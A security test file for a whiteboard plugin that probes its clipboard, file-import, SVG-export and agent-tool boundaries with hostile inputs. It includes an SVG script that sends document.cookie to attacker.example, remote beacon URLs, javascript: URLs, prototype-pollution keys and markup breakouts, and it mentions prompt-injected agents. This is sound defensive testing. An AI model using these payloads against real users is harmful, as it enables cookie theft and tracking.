// Adversarial pass: untrusted input, injection, and resource abuse.
//
// Every trust boundary here takes bytes the user did not author — the OS
// clipboard, an imported file, a board an agent was steered into writing — and
// every test below states the behaviour that boundary OUGHT to have. A failing
// test is a finding; the passing ones pin down boundaries that are already
// correct so a later change cannot quietly loosen them.
//
// Detect-only: nothing outside this file is modified.
import { describe, expect, it } from "vitest";
import {
  createFakePluginHost,
  type FakePluginHost,
} from "@get-bb/plugin-sdk/testing";
import { imageNodeOperation, parseClipboard, pasteOperations } from "../src/clipboard";
import { parseBoardImport, serializeBoardJson, serializeBoardSvg } from "../src/portable";
import {
  applyBoardOperations,
  boardDocumentSchema,
  createEmptyBoard,
  type BoardDocument,
  type BoardOperation,
} from "../src/domain";
import plugin, { rpcContract } from "../server";

const NOW = "2026-09-06T12:00:00.000Z";

function counter(prefix = "id"): () => string {
  let index = 0;
  return () => `${prefix}-${(index += 1)}`;
}

function empty(title = "Board"): BoardDocument {
  return createEmptyBoard({ id: "board-1", title, now: NOW });
}

function apply(board: BoardDocument, operations: BoardOperation[]): BoardDocument {
  return applyBoardOperations(board, operations, { now: NOW, makeId: counter() });
}

/** A clipboard string exactly as a hostile process would leave it on the OS clipboard. */
function clip(nodes: unknown[], edges: unknown[] = []): string {
  return JSON.stringify({ mime: "application/x-bb-canvas", version: 1, nodes, edges });
}

function hostileNode(overrides: Record<string, unknown>): Record<string, unknown> {
  return {
    id: "a",
    kind: "rectangle",
    x: 0,
    y: 0,
    width: 200,
    height: 120,
    text: "",
    color: "blue",
    ...overrides,
  };
}

/** Build a board directly from a document shape, bypassing the operation cap. */
function documentOf(nodes: unknown[]): BoardDocument {
  return boardDocumentSchema.parse({ ...empty(), nodes });
}

async function parseXml(source: string): Promise<{ ok: boolean; message: string }> {
  // Variable specifier: jsdom ships no types and this file must typecheck.
  const specifier = "jsdom";
  const { JSDOM } = (await import(/* @vite-ignore */ specifier)) as {
    JSDOM: new () => { window: { DOMParser: typeof DOMParser } };
  };
  const dom = new JSDOM();
  const doc = new dom.window.DOMParser().parseFromString(source, "image/svg+xml");
  const error = doc.querySelector("parsererror");
  return error === null
    ? { ok: true, message: "" }
    : { ok: false, message: error.textContent ?? "parse error" };
}

// ---------------------------------------------------------------------------
// 1. The OS clipboard — src/clipboard.ts
// ---------------------------------------------------------------------------

describe("boundary: the OS clipboard", () => {
  it("rejects a pasted node whose imageData is a remote URL rather than inline image bytes", () => {
    // A hostile process leaves this on the clipboard. One Cmd-V and the IDE
    // renders <img src="https://attacker..."> (app.tsx:390), phoning home with
    // the user's IP and user-agent with no further interaction.
    const text = clip([
      hostileNode({ kind: "image", imageData: "https://attacker.example/beacon.png?id=victim" }),
    ]);

    // EXPECTED: imageData is "image bytes already read into a data URL"
    // (src/clipboard.ts:130) — anything that is not a data:image/... URL must
    // be refused at the boundary rather than rendered.
    expect(parseClipboard(text)).toBeNull();
  });

  it("rejects a pasted node whose imageData is a javascript: or data:text/html URL", () => {
    for (const url of ["javascript:alert(document.cookie)", "data:text/html;base64,PHNjcmlwdD4="]) {
      const parsed = parseClipboard(clip([hostileNode({ kind: "image", imageData: url })]));
      // EXPECTED: no scheme other than data:image/* survives the clipboard boundary.
      expect(parsed, `imageData ${url} must not survive parseClipboard`).toBeNull();
    }
  });

  it("lets a user paste back everything the same build let them copy", () => {
    // serializeSelection (src/clipboard.ts:37) caps nothing and the envelope
    // accepts 2000 nodes (src/clipboard.ts:28), but pasteOperations emits one
    // operation per node and applyBoardOperations refuses more than 200
    // (src/domain.ts:237). Select-all + copy + paste on a 250-node board is a
    // completely ordinary user action.
    const nodes = Array.from({ length: 250 }, (_, index) =>
      hostileNode({ id: `n${index}`, x: index * 10 }),
    );
    const payload = parseClipboard(clip(nodes));
    expect(payload?.nodes).toHaveLength(250);

    const operations = pasteOperations(payload!, { makeId: counter() });
    // EXPECTED: a paste the app itself produced applies — either because paste
    // batches, or because copy refuses to exceed what paste can replay.
    expect(() => apply(empty(), operations)).not.toThrow();
  });

  it("refuses a clipboard payload that names the same node id twice", () => {
    // Duplicate ids are silently accepted; pasteOperations keys its rename map
    // by the old id (src/clipboard.ts:78), so the second node overwrites the
    // first and every edge that pointed at the first is re-aimed at the second.
    const text = clip(
      [hostileNode({ id: "dup", x: 0 }), hostileNode({ id: "dup", x: 900 })],
      [{ id: "e1", source: "dup", target: "dup", color: "blue", label: "" }],
    );
    // EXPECTED: an id collision inside one payload is malformed input, not a
    // silent re-target.
    expect(parseClipboard(text)).toBeNull();
  });

  it("keeps its own image size limit and its error message in agreement", () => {
    const almost = "data:image/png;base64," + "A".repeat(6_000_000);
    // The message promises "under 5 MB"; the check fires at 7,000,000 chars
    // (src/clipboard.ts:18), so ~4.5 MB of real bytes over the stated limit
    // sails through and lands in the SQLite row.
    expect(() => imageNodeOperation(almost, { x: 0, y: 0 })).toThrow(/too large/i);
  });

  // ---- boundaries that hold ----

  it("HARDENED: prototype-pollution keys in a pasted node are rejected outright", () => {
    const text =
      '{"mime":"application/x-bb-canvas","version":1,"nodes":[{"id":"a","kind":"rectangle",' +
      '"x":0,"y":0,"width":200,"height":120,"text":"t","color":"blue",' +
      '"__proto__":{"polluted":true},"constructor":{"polluted":true}}],"edges":[]}';
    expect(parseClipboard(text)).toBeNull();
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("HARDENED: __proto__ and constructor as a groupId cannot pollute anything", () => {
    const payload = parseClipboard(
      clip([
        hostileNode({ id: "a", groupId: "__proto__" }),
        hostileNode({ id: "b", groupId: "constructor" }),
      ]),
    );
    const operations = pasteOperations(payload!, { makeId: counter() });
    for (const operation of operations) {
      expect(operation.type).toBe("add_node");
      if (operation.type !== "add_node") continue;
      expect(operation.node.groupId).toMatch(/^id-\d+$/);
    }
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.prototype.hasOwnProperty.call(Object.prototype, "polluted")).toBe(false);
  });

  it("HARDENED: deeply nested JSON is refused, not stack-overflowed", () => {
    const deep = '{"a":'.repeat(60_000) + "1" + "}".repeat(60_000);
    const text = `{"mime":"application/x-bb-canvas","version":1,"nodes":[],"edges":[],"x":${deep}}`;
    expect(() => parseClipboard(text)).not.toThrow();
    expect(parseClipboard(text)).toBeNull();
  });

  it("HARDENED: edges that reference nodes the payload omits are dropped", () => {
    const payload = parseClipboard(
      clip([], [{ id: "e", source: "ghost", target: "ghost2", color: "blue", label: "" }]),
    );
    expect(payload?.edges).toEqual([]);
  });

  it("HARDENED: a payload claiming 2000+ nodes or an oversized string is refused", () => {
    const tooMany = clip(Array.from({ length: 2001 }, (_, i) => hostileNode({ id: `n${i}` })));
    expect(parseClipboard(tooMany)).toBeNull();
    const huge = clip([hostileNode({ text: "A".repeat(10_001) })]);
    expect(parseClipboard(huge)).toBeNull();
    expect(parseClipboard("application/x-bb-canvas" + "A".repeat(5_000_000))).toBeNull();
  });

  it("HARDENED: pasted ids never collide with the board they land on", () => {
    const board = apply(empty(), [
      { type: "add_node", node: { id: "a", kind: "rectangle", x: 0, y: 0, color: "blue" } },
    ]);
    const payload = parseClipboard(clip([hostileNode({ id: "a" })]))!;
    const next = apply(board, pasteOperations(payload, { makeId: counter("fresh") }));
    expect(next.nodes.map((node) => node.id)).toEqual(["a", "fresh-1"]);
  });
});

// ---------------------------------------------------------------------------
// 2. File import — src/portable.ts
// ---------------------------------------------------------------------------

describe("boundary: file import", () => {
  it("validates the base64 body of an imported png, not merely its prefix", () => {
    // Only the data-URL prefix is checked (src/portable.ts:319). Anything at
    // all may follow it and is stored verbatim as a node's imageData.
    expect(() =>
      parseBoardImport({
        fileName: "photo.png",
        content: 'data:image/png;base64,not base64 at all <script>alert(1)</script>',
      }),
    ).toThrow(/could not be read as an image/i);
  });

  it("does not turn a script-bearing SVG into an image node verbatim", () => {
    // A metadata-less SVG is base64-wrapped whole and stored as a node's
    // imageData (src/portable.ts:307), scripts and foreignObject included.
    // Today it is inert only because app.tsx happens to render it through
    // <img src> rather than inlining it — one refactor away from script
    // execution inside a full-trust IDE tab.
    const hostile =
      '<svg xmlns="http://www.w3.org/2000/svg">' +
      '<script>fetch("https://attacker.example/?c="+document.cookie)</script>' +
      "</svg>";
    const parsed = parseBoardImport({ fileName: "diagram.svg", content: hostile });
    expect(parsed.kind).toBe("reference");
    if (parsed.kind !== "reference") return;
    const decoded = Buffer.from(parsed.node.imageData.split(",")[1] ?? "", "base64").toString();
    // EXPECTED: active content is stripped before an untrusted SVG is stored.
    expect(decoded).not.toMatch(/<script/i);
  });

  it("can re-import an SVG this same module exported", () => {
    // 50 nodes of legal text (each under the 10,000-char cap, 40x under the
    // 2000-node cap) export to an SVG larger than MAX_IMPORT_CHARS, because
    // serializeBoardSvg emits a <tspan> per line AND a full base64 copy of the
    // board in <metadata> (src/portable.ts:184, 261). The export is a dead
    // file: the app that wrote it will not read it back.
    const text = ("x\n".repeat(4999) + "x");
    const board = documentOf(
      Array.from({ length: 50 }, (_, index) => ({
        id: `n${index}`,
        kind: "rectangle",
        x: index * 300,
        y: 0,
        width: 200,
        height: 120,
        text,
        color: "blue",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      })),
    );
    const svg = serializeBoardSvg(board);
    // EXPECTED: an export round-trips. (It does not: the SVG is ~13x the board.)
    expect(() => parseBoardImport({ fileName: "board.svg", content: svg })).not.toThrow();
  });

  it("can re-import an SVG export of a board holding one legally-sized image", () => {
    // imageData may be 7,000,000 chars (src/domain.ts:35) but an import is
    // capped at 5,000,000 (src/portable.ts:13), and the SVG carries the image
    // twice — raw in href and base64 in metadata. A single 2.5 MB image makes
    // the board permanently un-round-trippable, silent data loss on restore.
    const board = documentOf([
      {
        id: "img",
        kind: "image",
        x: 0,
        y: 0,
        width: 480,
        height: 320,
        text: "",
        color: "gray",
        imageData: "data:image/png;base64," + "A".repeat(2_500_000),
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      },
    ]);
    expect(serializeBoardJson(board).length).toBeLessThan(5_000_000);
    const svg = serializeBoardSvg(board);
    expect(() => parseBoardImport({ fileName: "board.svg", content: svg })).not.toThrow();
  });

  it("rejects an imported board whose node carries a remote or javascript: imageData", () => {
    // Same defect as the clipboard, reached through a file instead: the
    // document schema types imageData as a bare string (src/domain.ts:35).
    const board = {
      ...empty("Imported"),
      nodes: [
        {
          id: "img",
          kind: "image",
          x: 0,
          y: 0,
          width: 480,
          height: 320,
          text: "",
          color: "gray",
          imageData: "https://attacker.example/beacon.png",
          fontFamily: "inter",
          fontSize: 16,
          fontWeight: 600,
          textAlign: "center",
          locked: false,
          groupId: null,
        },
      ],
    };
    expect(() =>
      parseBoardImport({ fileName: "board.canvas.json", content: JSON.stringify(board) }),
    ).toThrow();
  });

  // ---- boundaries that hold ----

  it("HARDENED: a future or wrong schemaVersion is refused", () => {
    for (const schemaVersion of [0, 2, 99, "1", null]) {
      const content = JSON.stringify({ ...empty(), schemaVersion });
      expect(() => parseBoardImport({ fileName: "b.canvas.json", content })).toThrow(
        /not a Canvas board file/,
      );
    }
  });

  it("HARDENED: damaged, decoy and non-JSON SVG metadata all fail closed", () => {
    const cases = [
      '<svg><metadata id="bb-canvas-data">%%%not-base64%%%</metadata></svg>',
      `<svg><metadata id="bb-canvas-data">${Buffer.from("not json").toString("base64")}</metadata></svg>`,
      `<svg><metadata id="bb-canvas-data">${Buffer.from('{"evil":true}').toString("base64")}</metadata></svg>`,
    ];
    for (const content of cases) {
      expect(() => parseBoardImport({ fileName: "b.svg", content })).toThrow();
    }
  });

  it("HARDENED: XML entity tricks in imported text never expand", () => {
    const board = JSON.parse(JSON.stringify(empty("&xxe; &lt;script&gt;")));
    board.nodes = [];
    const imported = parseBoardImport({
      fileName: "b.canvas.json",
      content: JSON.stringify(board),
    });
    expect(imported.kind).toBe("native");
    if (imported.kind !== "native") return;
    // Round-tripping through the SVG escapes the ampersand rather than
    // declaring or expanding an entity.
    const svg = serializeBoardSvg(imported.board);
    expect(svg).toContain("&amp;xxe;");
    expect(svg).not.toContain("<!ENTITY");
    expect(svg).not.toContain("<!DOCTYPE");
  });

  it("HARDENED: content over the 5,000,000-char cap is refused before parsing", () => {
    const over = "A".repeat(5_000_001);
    expect(() => parseBoardImport({ fileName: "b.json", content: over })).toThrow(/too large/);
    expect(() => parseBoardImport({ fileName: "b.json", content: "" })).toThrow(/empty/);
    // And just under the cap it is a parse failure, not a crash.
    expect(() =>
      parseBoardImport({ fileName: "b.json", content: "A".repeat(4_999_999) }),
    ).toThrow(/not valid JSON/);
  });

  it("HARDENED: an unknown extension is refused rather than sniffed", () => {
    for (const fileName of ["evil.html", "evil.svg.txt", "evil", "evil.js"]) {
      expect(() => parseBoardImport({ fileName, content: "<svg/>" })).toThrow(/Cannot import/);
    }
  });
});

// ---------------------------------------------------------------------------
// 3. SVG export escaping — src/portable.ts
// ---------------------------------------------------------------------------

describe("boundary: SVG export escaping", () => {
  it("does not read a node colour off Object.prototype", () => {
    // colorValue does a bare `PALETTE[id]` (src/portable.ts:59) on a free-form
    // 32-char string (src/domain.ts:18), so inherited members answer. The
    // result is interpolated into fill=/stroke= with NO escaping at all
    // (src/portable.ts:195, 226) — the attribute is safe only because these
    // particular inherited values happen to contain no quote character.
    for (const color of ["constructor", "toString", "hasOwnProperty", "__proto__"]) {
      const board = apply(empty(), [
        { type: "add_node", node: { id: "a", kind: "rectangle", x: 0, y: 0, color } },
      ]);
      const svg = serializeBoardSvg(board);
      // EXPECTED: an unrecognised colour falls back to the gray swatch.
      expect(svg, `colour ${color}`).not.toMatch(/\[native code\]|\[object Object\]/);
      expect(svg).toContain('fill="#d1d5db"');
    }
  });

  it("does not read an edge colour off Object.prototype either", () => {
    const board = apply(empty(), [
      { type: "add_node", node: { id: "a", kind: "rectangle", x: 0, y: 0, color: "blue" } },
      { type: "add_node", node: { id: "b", kind: "rectangle", x: 400, y: 0, color: "blue" } },
      { type: "add_edge", edge: { id: "e", source: "a", target: "b", color: "constructor" } },
    ]);
    expect(serializeBoardSvg(board)).not.toMatch(/\[native code\]/);
  });

  it("produces well-formed XML from a board carrying control characters", async () => {
    // escapeXml handles the five entities but not the C0 range
    // (src/portable.ts:62), while node text is a plain string capped only at
    // 10,000 chars (src/domain.ts:33). A NUL in a sticky makes the exported
    // .svg unopenable by any XML parser — and app.tsx's PNG export decodes the
    // same SVG through an <img>, so PNG export dies with it.
    const nasty = `left${String.fromCharCode(0)}right${String.fromCharCode(11)}${String.fromCharCode(31)}`;
    const board = apply(empty(`Title${String.fromCharCode(0)}`), [
      { type: "add_node", node: { id: "a", kind: "rectangle", x: 0, y: 0, color: "blue", text: nasty } },
    ]);
    const svg = serializeBoardSvg(board);
    // EXPECTED: control characters are stripped or replaced on export.
    expect([...svg].some((char) => char.charCodeAt(0) < 32 && char !== "\n")).toBe(false);
    const parsed = await parseXml(svg);
    expect(parsed.ok, parsed.message).toBe(true);
  });

  it("does not emit a remote href into an exported SVG", () => {
    // Every viewer who opens the exported diagram fetches the attacker's URL.
    const board = documentOf([
      {
        id: "img",
        kind: "image",
        x: 0,
        y: 0,
        width: 480,
        height: 320,
        text: "",
        color: "gray",
        imageData: "https://attacker.example/track.png?viewer=1",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      },
    ]);
    expect(serializeBoardSvg(board)).not.toContain("attacker.example");
  });

  // ---- boundaries that hold ----

  it("HARDENED: markup in the title, node text, edge label and ids is escaped", async () => {
    const breakout = '"><script>alert(1)</script><x y="';
    const board = apply(empty(breakout), [
      { type: "add_node", node: { id: breakout, kind: "rectangle", x: 0, y: 0, color: "blue", text: breakout } },
      { type: "add_node", node: { id: "b", kind: "rectangle", x: 400, y: 0, color: "blue", text: breakout } },
      { type: "add_edge", edge: { id: breakout + "e", source: breakout, target: "b", color: "blue", label: breakout } },
    ]);
    const svg = serializeBoardSvg(board);
    expect(svg).not.toContain("<script>");
    expect(svg).not.toContain("</svg><");
    expect(svg.match(/<x y=/)).toBeNull();
    const parsed = await parseXml(svg);
    expect(parsed.ok, parsed.message).toBe(true);
  });

  it("HARDENED: a colour that is neither a palette id nor a hex triple falls back", () => {
    for (const color of ['red" onload="alert(1)', "#ff0000; }", "url(#x)", "expression(1)"]) {
      const board = apply(empty(), [
        { type: "add_node", node: { id: "a", kind: "rectangle", x: 0, y: 0, color } },
      ]);
      const svg = serializeBoardSvg(board);
      expect(svg, `colour ${color}`).toContain('fill="#d1d5db"');
      expect(svg).not.toContain("onload");
    }
  });

  it("does not emit Infinity into the exported SVG for a legal but huge coordinate", () => {
    // num() checks Number.isFinite on its INPUT and then multiplies by 100
    // (src/portable.ts:72) — the multiply is what overflows. x = 1e308 is a
    // perfectly legal coordinate (z.number().finite(), src/domain.ts:29), so a
    // hostile clipboard, an imported file, or an agent talked into "put it very
    // far right" yields viewBox="Infinity ..." and x="Infinity": an SVG no
    // renderer will open and a PNG export that silently fails.
    const board = documentOf([
      {
        id: "a",
        kind: "rectangle",
        x: 1e308,
        y: -1e308,
        width: 4000,
        height: 4000,
        text: "",
        color: "blue",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      },
    ]);
    const svg = serializeBoardSvg(board);
    expect(svg).not.toContain("NaN");
    expect(svg).not.toContain("Infinity");
  });
});

// ---------------------------------------------------------------------------
// 4 & 5. The agent's tools and resource abuse — server.ts, src/domain.ts
// ---------------------------------------------------------------------------

interface Loaded {
  host: FakePluginHost;
}

async function load(): Promise<Loaded> {
  let threads = 0;
  const host = createFakePluginHost({
    pluginId: "canvas",
    sdk: {
      projects: { list: async () => [{ id: "project-1", name: "Project" }] },
      threads: {
        spawn: async () => {
          threads += 1;
          return { id: `thread-${threads}` };
        },
      },
    },
  });
  await plugin(host.bb);
  return { host };
}

function rpc<Method extends keyof typeof rpcContract>(
  loaded: Loaded,
  method: Method,
  input?: unknown,
): Promise<unknown> {
  return loaded.host.harness.callRpc(method as string, input ?? null);
}

describe("boundary: the chat agent and resource abuse", () => {
  it("caps the total payload one operation batch may write, not just the count", async () => {
    // Each add_node may carry 7,000,000 chars of imageData (src/domain.ts:114)
    // and a batch may hold 200 operations (src/domain.ts:237). Nothing bounds
    // count x size. A prompt-injected agent — or a scripted RPC client — turns
    // one call into a ~1.4 GB document_json; the eight-node version below
    // already writes ~55 MB into a single SQLite row in milliseconds, and the
    // board is then re-parsed and structuredClone'd on every subsequent edit.
    const image = "data:image/png;base64," + "A".repeat(6_900_000);
    const operations: BoardOperation[] = Array.from({ length: 8 }, (_, index) => ({
      type: "add_node",
      node: { id: `img${index}`, kind: "image", x: index * 600, y: 0, color: "gray", imageData: image },
    }));
    const next = apply(empty(), operations);
    // EXPECTED: a batch is rejected once its combined payload is unreasonable.
    expect(JSON.stringify(next).length).toBeLessThan(10_000_000);
  });

  it("caps the total size of a board, not only its node count", async () => {
    // The largest legal board is 2000 nodes x 10,000 chars of text plus
    // imageData: comfortably north of 20 MB of JSON in one row, rewritten in
    // full on every single drag of a single shape.
    const board = documentOf(
      Array.from({ length: 2000 }, (_, index) => ({
        id: `n${index}`,
        kind: "rectangle",
        x: index,
        y: 0,
        width: 200,
        height: 120,
        text: "y".repeat(10_000),
        color: "blue",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      })),
    );
    // EXPECTED: a documented ceiling on document bytes.
    expect(JSON.stringify(board).length).toBeLessThan(10_000_000);
  });

  it("stops a hostile board file from being pushed through the import RPC", async () => {
    // board_import bypasses applyBoardOperations entirely (server.ts:310) and
    // writes the imported document straight in, so neither the 200-operation
    // cap nor any per-operation validation applies to it. The only ceiling is
    // the 5 MB text cap.
    const loaded = await load();
    const boards = (await rpc(loaded, "boards_list")) as { boards: { id: string }[] };
    const boardId = boards.boards[0]!.id;
    const hostile = {
      ...empty("Injected"),
      nodes: [
        {
          id: "img",
          kind: "image",
          x: 0,
          y: 0,
          width: 480,
          height: 320,
          text: "",
          color: "gray",
          imageData: "https://attacker.example/beacon.png",
          fontFamily: "inter",
          fontSize: 16,
          fontWeight: 600,
          textAlign: "center",
          locked: false,
          groupId: null,
        },
      ],
    };
    await expect(
      rpc(loaded, "board_import", {
        boardId,
        fileName: "board.canvas.json",
        content: JSON.stringify(hostile),
      }),
    ).rejects.toThrow();
  });

  // ---- boundaries that hold ----

  it("HARDENED: an agent thread cannot reach a board other than its own", async () => {
    const loaded = await load();
    const first = (await rpc(loaded, "boards_list")) as { boards: { id: string; chatThreadId: string | null }[] };
    const boardA = first.boards[0]!;
    const created = (await rpc(loaded, "boards_create", { title: "Second" })) as {
      board: { id: string; chatThreadId: string | null };
    };
    const boardB = created.board;
    expect(boardA.chatThreadId).not.toBe(boardB.chatThreadId);

    await loaded.host.harness.callAgentTool(
      "canvas_apply_operations",
      { operations: [{ type: "rename_board", title: "OWNED" }] },
      { threadId: boardA.chatThreadId! },
    );
    const after = (await rpc(loaded, "board_get", { boardId: boardB.id })) as { board: { title: string } };
    expect(after.board.title).toBe("Second");

    // A thread with no board at all is refused rather than defaulting to one.
    const orphan = await loaded.host.harness.callAgentTool(
      "canvas_apply_operations",
      { operations: [{ type: "rename_board", title: "OWNED" }] },
      { threadId: "thread-does-not-exist" },
    );
    expect(JSON.stringify(orphan)).toMatch(/not linked to a Canvas board/);
  });

  it("HARDENED: the 200-operation and 2000-node ceilings are both enforced", () => {
    const tooMany: BoardOperation[] = Array.from({ length: 201 }, (_, index) => ({
      type: "add_node",
      node: { id: `n${index}`, kind: "rectangle", x: index, y: 0, color: "blue" },
    }));
    expect(() => apply(empty(), tooMany)).toThrow(/maximum of 200 operations/);

    const full = documentOf(
      Array.from({ length: 2000 }, (_, index) => ({
        id: `n${index}`,
        kind: "rectangle",
        x: index,
        y: 0,
        width: 200,
        height: 120,
        text: "",
        color: "blue",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      })),
    );
    expect(() =>
      apply(full, [{ type: "add_node", node: { id: "extra", kind: "rectangle", x: 0, y: 0, color: "blue" } }]),
    ).toThrow();
  });

  it("HARDENED: editing the largest legal board stays fast (no quadratic blowup)", () => {
    const board = documentOf(
      Array.from({ length: 2000 }, (_, index) => ({
        id: `n${index}`,
        kind: "rectangle",
        x: index,
        y: 0,
        width: 200,
        height: 120,
        text: "y".repeat(10_000),
        color: "blue",
        fontFamily: "inter",
        fontSize: 16,
        fontWeight: 600,
        textAlign: "center",
        locked: false,
        groupId: null,
      })),
    );
    const started = Date.now();
    apply(board, [{ type: "update_node", id: "n0", patch: { x: 5 } }]);
    expect(Date.now() - started).toBeLessThan(1000);
  });

  it("HARDENED: an agent operation batch is all-or-nothing on the stored board", async () => {
    const loaded = await load();
    const boards = (await rpc(loaded, "boards_list")) as { boards: { id: string; chatThreadId: string | null }[] };
    const board = boards.boards[0]!;
    await loaded.host.harness.callAgentTool(
      "canvas_apply_operations",
      {
        operations: [
          { type: "rename_board", title: "Renamed" },
          { type: "add_edge", edge: { source: "ghost", target: "ghost2", color: "blue" } },
        ],
      },
      { threadId: board.chatThreadId! },
    );
    const after = (await rpc(loaded, "board_get", { boardId: board.id })) as {
      board: { title: string; version: number };
    };
    expect(after.board.title).not.toBe("Renamed");
    expect(after.board.version).toBe(0);
  });
});
